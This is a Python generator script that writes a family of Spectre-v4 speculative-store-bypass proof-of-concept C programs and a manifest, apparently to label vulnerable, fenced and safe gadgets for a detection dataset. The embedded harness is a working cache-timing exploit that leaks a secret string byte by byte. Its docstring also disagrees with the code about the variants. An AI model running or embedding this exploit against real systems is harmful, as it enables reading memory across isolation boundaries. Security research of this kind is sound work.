#!/usr/bin/env python3
"""Generate a FAMILY of runnable Spectre-v4 (speculative store bypass) PoCs for
oracle labelling. Each gadget is a matched pair member: identical store-bypass
structure, differing ONLY by mitigation (unfenced vs lfence). Both keep the
flush+window that sustain the bypass, so the leak/safe label the oracle assigns
is caused by the fence alone — a signal the PDG builder CAN see (FENCE_BOUNDARY).

Structural variety across the 8 base structures (stride, indirection depth,
harmless dead ops, register spread) makes the resulting graphs differ, so the
labelled set is not 16 clones. Harness mirrors spectre_full.c so the InvisiSpec
validator's "Success: 0xNN" parser registers real byte recovery.

Emits, per gadget: out/<gadget_id>.c  and appends a metadata line to
out/v4_family_manifest.jsonl  {gadget_id, structure_id, fence, stride,
indirection, dead_ops, expected_leak}.
"""
import json, os, itertools
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

HARNESS_HEAD = r'''/* AUTO-GENERATED Spectre-v4 (SSB) PoC — gadget_id=%(gid)s
 * structure=%(sid)d fence=%(fence)s stride=%(stride)d indirection=%(indir)d dead_ops=%(dead)d
 * expected_leak=%(exp)s  (unfenced+flush+window -> leak; lfence -> safe)
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>

/* real inline speculation barrier — survives at -O0 (the _mm_lfence intrinsic is
 * emitted as an out-of-line CALL at -O0, hiding the fence from the graph). */
#if defined(__x86_64__)
  #define SPEC_FENCE() __asm__ __volatile__("lfence" ::: "memory")
#elif defined(__aarch64__)
  #define SPEC_FENCE() __asm__ __volatile__("dsb sy\n\tisb" ::: "memory")
#else
  #define SPEC_FENCE() __asm__ __volatile__("" ::: "memory")
#endif

uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t public_byte = 0;
uint8_t temp = 0;
uint8_t * volatile slot;
%(extra_globals)s
'''

# victim body knobs. FENCE token, STRIDE shift, indirection (extra pointer hop),
# dead ops (harmless graph-expanding arithmetic).
VICTIM_TMPL = r'''
void victim_function_v4(uint8_t *public_ptr) {
  slot = public_ptr;                 /* STORE: redirect slot to the public byte */
%(fence_line)s%(dead_block)s  uint8_t v = %(load_expr)s;   /* LOAD+DEREF: may bypass the store */
  temp &= array2[v << %(stride)d];   /* transmit v through the cache */
}
'''

HARNESS_TAIL = r'''
#define CACHE_HIT_THRESHOLD (80)

void readMemoryByte(uint8_t *secret_ptr, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  for (i = 0; i < 256; i++) results[i] = 0;
  for (tries = 999; tries > 0; tries--) {
    for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
    for (j = 29; j >= 0; j--) {
      slot = secret_ptr;
      _mm_clflush((void *)&slot);              /* delay store resolution */
      for (volatile int z = 0; z < 100; z++) {} /* widen the window */
      victim_function_v4(&public_byte);
    }
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      time1 = __rdtscp(&junk);
      time1 = __rdtscp(&junk);
      junk = *addr;
      time2 = __rdtscp(&junk) - time1;
      time2 = __rdtscp(&junk) - time1;
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != public_byte)
        results[mix_i]++;
    }
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
      else if (k < 0 || results[i] >= results[k]) { k = i; }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break;
  }
  results[0] ^= junk;
  value[0] = (uint8_t)j; score[0] = results[j];
  value[1] = (uint8_t)k; score[1] = results[k];
}

int main(void) {
  int i, score[2], len = 40; uint8_t value[2];
  for (i = 0; i < (int)sizeof(array2); i++) array2[i] = 1;
  printf("Reading %d bytes (SSB / Spectre v4):\n", len);
  int correct = 0;
  for (i = 0; i < len; i++) {
    printf("Reading secret byte %d... ", i);
    readMemoryByte((uint8_t *)(secret + i), value, score);
    /* A leak means we recovered the ACTUAL secret byte, not merely a confident
     * cache hit. Emit "Success: 0xNN" (the parser's leak marker) ONLY when the
     * recovered value equals the true secret; otherwise "Miss". A confident hit
     * on a wrong line (noise) must NOT count as a leak. */
    int want = (unsigned char)secret[i];
    int ok = (score[0] >= 2 * score[1]) && ((int)value[0] == want);
    printf("%s: 0x%02X='%c' score=%d (want 0x%02X)\n", ok ? "Success" : "Miss",
           value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'),
           score[0], want);
    correct += ok;
  }
  printf("RECOVERED %d/%d secret bytes\n", correct, len);
  return 0;
}
'''

def make_dead_block(n):
    # harmless arithmetic on temp + locals; expands the graph, no semantic effect
    if n == 0:
        return ""
    lines = []
    for d in range(n):
        lines.append("  temp ^= (uint8_t)((temp + %d) & 0);" % (d * 7 + 1))
    return "\n".join(lines) + "\n"

def make_load(indir):
    # indirection=0: v = *slot;  indirection=1: hop through an extra pointer
    if indir == 0:
        return "*slot"
    # extra indirection: read slot into a local pointer, then deref (same target)
    return "*(*(uint8_t * volatile *)&slot)"

def gen():
    manifest = []
    # 8 base structures = combinations of (stride, indirection, dead_ops)
    strides = [9, 10, 11, 12]          # transmit shift
    indirs = [0, 1]                    # pointer-hop depth
    # pick 8 distinct (stride, indir, dead) structures
    bases = []
    for sid, (stride, indir) in enumerate(itertools.product(strides, indirs)):
        dead = sid % 3                 # 0,1,2 dead ops, spread across structures
        bases.append((sid, stride, indir, dead))
    assert len(bases) == 8, len(bases)

    for sid, stride, indir, dead in bases:
        # vuln = reload the just-stored global (v=*slot) -> store-bypass possible.
        # safe = load the value directly from the arg (v=*public_ptr) -> no
        # store->load-same-address, no bypass. The oracle (InvisiSpec) refuted the
        # fence as a discriminator, so the label difference is now STRUCTURAL:
        # self-reload-of-stored-location (leak) vs direct-arg-load (safe).
        for variant in ("vuln", "fenced", "safe"):
            gid = "v4fam_s%d_st%d_ind%d_d%d_%s" % (sid, stride, indir, dead, variant)
            expected_leak = (variant == "vuln")   # fenced/safe expected non-leak
            load_expr = "*public_ptr" if variant == "safe" else make_load(indir)
            fence_line = ("  SPEC_FENCE();                      /* SSBD: blocks the bypass */\n"
                          if variant == "fenced" else "")
            victim = VICTIM_TMPL % {
                "fence_line": fence_line,
                "dead_block": make_dead_block(dead),
                "load_expr": load_expr,
                "stride": stride,
            }
            head = HARNESS_HEAD % {
                "gid": gid, "sid": sid, "fence": variant, "stride": stride,
                "indir": indir, "dead": dead, "exp": expected_leak,
                "extra_globals": "",
            }
            src = head + victim + HARNESS_TAIL
            path = os.path.join(OUT, gid + ".c")
            with open(path, "w") as f:
                f.write(src)
            # victim-only .c (extern globals + victim) — compiled to .s for the
            # training-record fragment (the runnable PoC above is for the oracle).
            vic_only = (
                "#include <stdint.h>\n"
                "#if defined(__x86_64__)\n"
                "  #define SPEC_FENCE() __asm__ __volatile__(\"lfence\" ::: \"memory\")\n"
                "#elif defined(__aarch64__)\n"
                "  #define SPEC_FENCE() __asm__ __volatile__(\"dsb sy\\n\\tisb\" ::: \"memory\")\n"
                "#else\n"
                "  #define SPEC_FENCE() __asm__ __volatile__(\"\" ::: \"memory\")\n"
                "#endif\n"
                "extern uint8_t array2[256 * 512];\n"
                "extern uint8_t public_byte;\n"
                "extern uint8_t temp;\n"
                "extern uint8_t * volatile slot;\n"
                + victim
            )
            vpath = os.path.join(OUT, gid + "_victim.c")
            with open(vpath, "w") as f:
                f.write(vic_only)
            root = os.path.dirname(os.path.dirname(HERE))
            manifest.append({
                "gadget_id": gid, "structure_id": sid, "variant": variant,
                "stride": stride, "indirection": indir, "dead_ops": dead,
                "expected_leak": expected_leak,
                "source_c": os.path.relpath(path, root),
                "victim_c": os.path.relpath(vpath, root),
            })
    mpath = os.path.join(OUT, "v4_family_manifest.jsonl")
    with open(mpath, "w") as f:
        for r in manifest:
            f.write(json.dumps(r, sort_keys=True) + "\n")
    print("wrote %d gadgets (%d pairs) -> %s" % (len(manifest), len(manifest)//2, OUT))
    print("manifest -> %s" % mpath)
    print("expected leakers:", sum(1 for r in manifest if r["expected_leak"]))

if __name__ == "__main__":
    gen()
